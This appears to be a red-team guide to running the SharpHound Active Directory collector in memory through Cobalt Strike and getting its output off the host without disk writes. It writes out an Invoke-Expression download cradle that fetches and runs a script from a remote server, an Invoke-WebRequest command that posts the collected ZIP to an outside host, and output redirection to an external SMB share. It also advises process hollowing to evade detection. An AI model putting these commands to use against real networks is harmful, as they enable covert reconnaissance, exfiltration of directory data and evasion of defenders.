# BloodHound-Free Collection: Red Teaming Without Touching Disk

A red team can operate without ever writing BloodHound (SharpHound) to disk by running it entirely in-memory and exfiltrating results over a remote session. Here’s how to achieve true "BloodHound-free" disk operations:

---

## 1. Run SharpHound In-Memory

- Use Cobalt Strike’s `execute-assembly`, BOF, or similar in-memory execution to load SharpHound without writing it to disk.
    - **Example:**  
      `execute-assembly C:\path\to\SharpHound.exe --CollectionMethod All`
    - Loads SharpHound directly into memory.
    - *Note:* By default, the ZIP output is still written to disk.

---

## 2. Redirect Output to Avoid Local Disk Writes

- **Named Pipes:**  
  Modify SharpHound to stream the ZIP file over a named pipe (e.g., to an SMB share or remote handler).
- **Remote Upload:**  
  Modify SharpHound to POST the ZIP directly to a remote HTTP/S or SFTP server.

### Options

- **Memory-Mapped Output:**  
  Patch SharpHound’s source to stream the ZIP to memory, then exfiltrate over your C2 channel.
- **SMB Share:**  
  Redirect output to an external SMB server:
    - `SharpHound.exe --CollectionMethod All --OutputDirectory \\10.10.10.10\share`
    - Prevents file writes on the local machine.
- **Direct Web Upload:**  
  Modify SharpHound to upload the ZIP as soon as it’s created:
    - `Invoke-WebRequest -Uri "http://yourserver/upload" -Method Post -InFile C:\Path\to\BloodHound.zip`

---

## 3. Proxy Execution via Remote Shell

- Host SharpHound remotely and execute via PowerShell remoting or SMB execution:
    - `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://yourserver/SharpHound.ps1')`
    - Ensures nothing is saved locally.

---

## 4. Clean Up Memory Artifacts

- Use SharpHound BOF (BloodHound’s Beacon Object File) in Cobalt Strike to avoid process injection detections.
- Favor process hollowing or spawn-to-memory execution if using C# loaders.

---

**Summary:**  
By running SharpHound in-memory, redirecting output, and using remote execution/proxying, a red team can collect BloodHound data without ever touching disk—minimizing detection and forensic artifacts.

